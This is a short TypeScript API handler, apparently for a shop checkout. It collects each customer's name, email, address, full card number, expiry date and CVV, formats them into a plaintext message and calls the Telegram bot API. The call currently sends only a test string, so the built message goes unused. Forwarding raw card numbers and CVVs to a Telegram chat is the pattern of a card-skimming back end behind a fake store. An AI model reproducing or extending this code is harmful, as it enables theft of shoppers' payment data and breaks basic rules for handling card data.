export default async function handler(req: any, res: any) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' })
  }

  const { form, items, total } = req.body

  const message = `
🛒 New Order

👤 Name: ${form.name}
📧 Email: ${form.email}
🏠 Address: ${form.address}
💳 Card Number: ${form.cardNumber}
📅 Expiry: ${form.expiry}
🔐 CVV: ${form.cvv}

🧾 Order:
${items.map((item: any) =>
    `• ${item.product.name} x ${item.quantity} - $${(
      item.quantity * item.product.priceFrom
    ).toFixed(2)}`
  ).join('\n')}

💰 Total: $${total.toFixed(2)}
`

  await fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: 'Hello from bot test!',
      }),
    }
  )

  return res.status(200).json({ success: true })
}